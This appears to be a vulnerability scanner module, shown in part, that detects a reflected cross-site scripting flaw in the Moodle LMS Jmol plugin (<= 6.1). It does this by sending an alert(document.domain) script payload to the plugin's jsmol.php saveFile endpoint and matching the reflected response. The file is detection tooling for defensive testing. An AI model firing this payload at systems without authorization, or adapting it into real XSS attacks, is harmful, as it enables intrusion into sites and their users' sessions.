#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A reflected cross-site scripting (XSS) vulnerability exists in the Moodle LMS Jmol plugin version 6."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Moodle LMS Jmol Plugin <= 6.1 - Cross-Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'moodle', 'xss', 'edb', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        path = '/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(document.domain)%3C/script%3E&mimetype=text/html'
        ...
        ctype_any = ('text/html',)
        body_regexes = ('^<script>alert\\(document\\.domain\\)</script>\\s*$',)
        if (any(m in content_type for m in ctype_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason='Moodle LMS Jmol Plugin <= 6.1 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False
